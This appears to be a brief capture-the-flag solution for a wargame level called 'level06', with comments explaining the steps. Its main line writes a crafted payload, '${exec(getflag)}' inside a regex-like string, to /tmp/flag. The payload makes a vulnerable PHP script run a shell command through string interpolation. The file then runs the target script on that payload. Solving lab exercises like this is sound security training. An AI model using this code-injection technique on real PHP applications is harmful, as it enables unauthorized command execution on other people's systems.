# Let's find a way to execute getflag through this portion of code
# the first parameter must be a file so we have to communicate the file to the script

echo '/(\[x (.{${exec(getflag)}})\])' > /tmp/flag

# Exec is a php function to execute bash command, getflag the command that we want to launch
# Execute the script: ./level06 /tmp/flag aa
